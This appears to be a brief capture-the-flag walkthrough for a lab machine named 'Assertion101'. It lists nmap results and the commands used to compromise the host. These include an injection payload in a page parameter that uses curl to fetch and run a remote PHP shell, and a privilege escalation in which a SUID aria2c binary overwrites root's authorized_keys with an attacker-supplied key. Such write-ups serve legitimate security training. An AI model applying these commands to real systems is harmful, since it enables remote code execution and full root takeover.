----------------------------------------------------
# Author -> Shubham Rannpise
----------------------------------------------------
# Assertion101
# 25/2/2023

----------------------------------------------------
# LFI 
```http://192.168.141.94/index.php?page=gallery

' and die(system("curl http://<ip>/shell.php|php")) or '
```
----------------------------------------------------
# nmap result
----------------------------------------------------
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```
----------------------------------------------------
# priv esc
----------------------------------------------------
```
find / -perm -u=s -type f 2>/dev/null 
aria2c

transfer ssh pub file in client
/usr/bin/aria2c -d /root/.ssh/ -o authorized_keys "http://192.168.49.141/id_rsa.pub" --allow-overwrite=true
```
